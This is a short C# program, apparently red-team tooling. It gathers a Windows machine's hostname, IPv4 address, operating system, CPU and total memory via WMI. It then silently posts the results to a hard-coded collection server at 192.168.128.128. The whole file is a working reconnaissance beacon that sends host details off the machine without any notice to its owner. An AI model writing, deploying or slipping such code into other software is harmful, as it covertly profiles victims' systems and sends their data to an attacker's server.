using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;

namespace RedTeamDev
{
    class Program
    {
        

        static void Main(string[] args)
        {
            GeneralInfo infoObj = new GeneralInfo();

            string address = "http://192.168.128.128/getresults.php";
            System.Net.WebClient webObj = new System.Net.WebClient();
            double totalCapacity = 0;
            ObjectQuery objectQuery = new ObjectQuery("select * from Win32_PhysicalMemory");
            ManagementObjectSearcher searcher = new
            ManagementObjectSearcher(objectQuery);
            ManagementObjectCollection vals = searcher.Get();

            foreach(ManagementObject val in vals)
            {
                totalCapacity += System.Convert.ToDouble(val.GetPropertyValue("Capacity"));
            }

            string parameters = "hostname=" + infoObj.hostName + "&ip=" + infoObj.ipv4address + "&operatingsystem=" + infoObj.oSystem + "&CPU=" + infoObj.CPU + "&memory=" + (totalCapacity / 1073741824).ToString();
            webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            webObj.UploadString(address, parameters);
             
        }
    }
}
